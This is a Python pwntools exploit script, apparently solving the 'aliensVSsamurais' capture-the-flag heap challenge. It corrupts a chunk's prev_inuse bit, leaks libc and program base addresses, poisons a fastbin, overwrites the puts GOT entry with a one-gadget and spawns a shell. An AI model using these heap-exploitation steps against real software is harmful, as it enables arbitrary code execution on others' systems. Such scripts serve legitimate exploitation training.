import pwn as p


target = p.process('./aliensVSsamurais', env={'LD_PRELOAD': './libc-2.23.so'})
p.gdb.attach(target)

elf = p.ELF('./aliensVSsamurais')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b), end='')


def create_samurai(weapon_name: bytes):
    prints(target.recvuntil(b'Daimyo, nani o shitaidesu ka?'))
    target.sendline(b'1')
    prints(target.recvuntil(b'What is my weapon\'s name?'))
    target.sendline(weapon_name)


def kill_samurai(index: int):
    prints(target.recvuntil(b'Daimyo, nani o shitaidesu ka?'))
    target.sendline(b'2')
    prints(target.recvuntil(b'Which samurai was dishonorable O lord daimyo?'))
    target.sendline(b(str(index)))


def finish_samurai():
    prints(target.recvuntil(b'Daimyo, nani o shitaidesu ka?'))
    target.sendline(b'3')


def create_alien(name_len: int, name: bytes):
    prints(target.recvuntil(b'Brood mother, what tasks do we have today.'))
    target.sendline(b'1')
    prints(target.recvuntil(b'How long is my name?'))
    target.sendline(b(str(name_len)))
    prints(target.recvuntil(b'What is my name?'))
    target.send(name)


def kill_alien(index: int):
    prints(target.recvuntil(b'Brood mother, what tasks do we have today.'))
    target.sendline(b'2')
    prints(target.recvuntil(b'Which alien is unsatisfactory, brood mother?'))
    target.sendline(b(str(index)))


def rename_alien(index: int, new_name: bytes):
    prints(target.recvuntil(b'Brood mother, what tasks do we have today.'))
    target.sendline(b'3')
    prints(target.recvuntil(b'Brood mother, which one of my babies would you like to rename?'))
    target.sendline(b(str(index)))
    # prints(target.recvuntil(b' to?')) # printing this might break conversion to utf8
    target.send(new_name)


def no_overwrite_leak(index: int):
    prints(target.recvuntil(b'Brood mother, what tasks do we have today.'))
    target.sendline(b'3')
    prints(target.recvuntil(b'Brood mother, which one of my babies would you like to rename?'))
    target.sendline(b(str(index)))
    prints(target.recvuntil(b'Oh great what would you like to rename '))
    raw_leak = target.recvuntil(b' to?').replace(b' to?', b'')
    leak = p.u64(raw_leak + b'\x00'*(8 - len(raw_leak)))

    # send back leak so we don't change anything
    target.send(raw_leak)

    return leak


def finish_alien():
    prints(target.recvuntil(b'Brood mother, what tasks do we have today.'))
    target.sendline(b'4')


finish_samurai()

# Create spare 0x20 chunks
create_alien(0x10, b'0'*0x10)
create_alien(0x10, b'1'*0x10)
kill_alien(0)
kill_alien(1)


create_alien(0xf0, b'2'*0x20)
create_alien(0x60, b'3'*0x20)
create_alien(0xf0, b'4'*0x20)
create_alien(0x10, b'5'*0x10)
kill_alien(2)
kill_alien(3)

# overwrite prev_inuse of next chunk
create_alien(0x68, b'6'*0x60 + p.p64(0x170))

# free overwritten chunk
kill_alien(4)

create_alien(0xf0, b'7'*0x20)

main_arena_leak = no_overwrite_leak(6)
print('main_arena_leak:', hex(main_arena_leak))
libc_leak = main_arena_leak - 0x3c4b78
print('libc_leak:', hex(libc_leak))


pie_raw_leak = no_overwrite_leak(-10)
print('pie_leak:', hex(pie_raw_leak))
exec_base = pie_raw_leak - 0x202070
print('exec_base:', hex(exec_base))

# Spawn fake chunk #

# Create an entry in fastbin where we have write access (the one that leaked main_arena previously)
create_alien(0x60, b'\x08'*0x20)
kill_alien(8)

# overwrite fd pointer with fake chunk (here I took free_hook entry as per the tutorial)
bss_free_hook = exec_base + 0x20208d
print('bss_free_hook:', hex(bss_free_hook))
rename_alien(6, p.p64(bss_free_hook))

# allocating this chunk will spwan another on in fastbin @bss_free_hook
create_alien(0x60, b'\x09'*0x20)

# allocate our fake chunk, it's name is pointing at puts' got entry
create_alien(0x60, b'159' + p.p64(bss_free_hook + 3 + 0x18) + p.p64(exec_base + elf.got['puts'])[:6])

# overwrite the entry with our gadget
gadget = libc_leak + 0x45216
rename_alien(-4, p.p64(gadget))


target.interactive()
